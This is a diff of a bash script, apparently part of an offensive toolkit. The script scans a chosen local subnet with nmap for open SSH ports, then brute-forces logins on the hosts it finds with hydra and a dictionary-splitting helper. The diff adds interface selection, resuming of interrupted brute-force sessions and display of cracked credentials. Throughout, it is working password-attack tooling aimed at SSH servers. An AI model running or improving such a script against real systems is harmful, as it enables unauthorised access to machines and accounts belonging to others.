@@ -8,28 +8,63 @@ green="\033[1;32m"
 purple="\033[0;35m"
 
 #---------------------------------User select the interface------------------------------
-ans="n"
-$networkC
-allInterface=$(ip link show | grep '^[1-9]' | cut -d ' ' -f 2  | cut -d ":" -f -1 | grep -v "lo")
-while [ $ans != "y" ]
-do
-	for interface in $allInterface
-		do
-		clear
-		echo -e $title" choose the interface :"$transparent
-		echo -e $bReverse""$interface" (y/n)"$transparent
-		read ans
-		if [ $ans = "y" ]; then
-			netMask=$(sudo ip a show $interface | grep "inet " | cut -d " " -f 6 | cut -d "/" -f 2)
-			network=$(sudo route -n | grep $interface | cut -d " " -f 1 | grep -v "0.0.0.0")
-			networkC=$network"/"$netMask
-			if [ -z $network ]; then
-				echo "interface not initialized"
-				exit
+
+networkC=""
+
+#----------Stuff------------------------------------------------------------------------------------
+function networkAdress {
+	allInterface=$(ip link show | grep '^[1-9]' | cut -d ' ' -f 2  | cut -d ":" -f -1 | grep -v "lo")
+	ans="n"
+	while [ $ans != "y" ]
+	do
+		for interface in $allInterface
+			do
+			clear
+			echo -e $title" choose the interface :"$transparent
+			echo -e $bReverse""$interface" (y/n)"$transparent
+			read ans
+			if [ $ans = "y" ]; then
+				netMask=$(sudo ip a show $interface | grep "inet " | cut -d " " -f 6 | cut -d "/" -f 2)
+				network=$(sudo route -n | grep $interface | cut -d " " -f 1 | grep -v "0.0.0.0")
+				networkC=$network"/"$netMask
+				if [ -z $network ]; then
+					echo "interface not initialized"
+					exit
+				fi
 			fi
-		fi
+		done
 	done
-done
+}
+
+#---------------------------------Restore a bruteforce process-----------------------------
+if [ ! -e ".restoreBruteForcessh" ]; then 
+			echo "no restore file found."
+else
+	clear
+	target=$(cat .restoreBruteForcessh | cut -d " " -f 1)
+	dico=$(cat .restoreBruteForcessh | cut -d " " -f 2)
+	option=$(cat .restoreBruteForcessh | cut -d " " -f 3)
+	user=$(cat .restoreBruteForcessh | cut -d " " -f 4)
+	begin=$(cat .restoreBruteForcessh | cut -d " " -f 5)
+	echo -e $green"we found a previous session !"$transparent
+	echo -e "you were attacking$title $target "$transparent"with$title $dico"$transparent	 
+	echo "press y to resume the last bruteforce attack"
+	echo "press n to start a new  bruteforce attack"
+	read ans 
+	if [ $ans = "y" ]; then
+		echo "./bruteforce/src/cutterBruteForce.sh $target $dico $option $user "ssh" $begin"
+		./bruteforce/src/cutterBruteForce.sh $target $dico $option $user "ssh" $begin
+		rm ".restoreBruteForcessh"
+		echo -e $green"result saved in result/scanNetwork/pass_hostname"$transparent
+		echo -e $title"press a button to  quit"$transparent
+		read tmp
+		return
+	else 
+		rm ".restoreBruteForcessh"
+	fi
+fi
+
+
 
 #---------------------------------Scann the network------------------------------
 clear
@@ -41,6 +76,7 @@ if [ $? -eq 0 ]; then
 	if [ $((`date +%s`-`date -r result/scanNetwork/scanSSH +%s`)) -gt 3600 ]; then
 		clear
 		rm result/scanNetwork/scanSSH 2> /dev/null
+		networkAdress
 		nmap -p 22 $networkC -oG result/scanNetwork/scanSSH --open
 	else
 		echo "we found a recent ssh scan file."
@@ -53,11 +89,13 @@ if [ $? -eq 0 ]; then
 		else
 			clear
 			rm result/scanNetwork/scanSSH 2> /dev/null
+			networkAdress
 			nmap -p 22 $networkC -oG result/scanNetwork/scanSSH --open
 		fi
 	fi
 else
 	clear
+	networkAdress
 	nmap -p 22 $networkC -oG result/scanNetwork/scanSSH --open
 fi
 
@@ -213,15 +251,15 @@ fi
 echo $usernameOption $username
 echo $passwordOption $password
 
-#Like hydra generate false negative with dictionary  bigger than 90 words
+#Because hydra generate false negative with dictionary  bigger than 90 words
 #I cut gradually the password dictionary.
 #This is actually the better to solve the problem ^^
 #it' important to cut gradually the dictionary to avoid saturating the memory.
-
 if [ $passwordOption = "-P" ]; then
 	user="$usernameOption $username"
 	./bruteforce/src/cutterBruteForce.sh ${addressArray[i]} $password $user "ssh"
 	tail -n 2 result/scanNetwork/tmp >> "result/scanNetwork/pass_${hostnamesArray[i]}"
+	rm result/scanNetwork/tmp
 else
 	echo "hydra ${addressArray[i]} ssh -V $usernameOption $username $passwordOption $password -e s -t 10"
 	hydra ${addressArray[i]} ssh -vV $usernameOption $username $passwordOption $password -e s -F -o "result/scanNetwork/pass_${hostnamesArray[i]}"
@@ -232,6 +270,13 @@ fi
 #	sed -i '1d' "conf/dico/${dicoArray[k]}"
 #fi
 ##
-echo -e $green"result saved in result/scanNetwork/pass_hostname"$transparent
+echo -e $green
+tail -n 1 "result/scanNetwork/pass_${hostnamesArray[i]}"
+echo -e "result saved in result/scanNetwork/pass_hostname"$transparent
 echo -e $title"press a button to  quit"$transparent
 read tmp
+
+
+
+
+
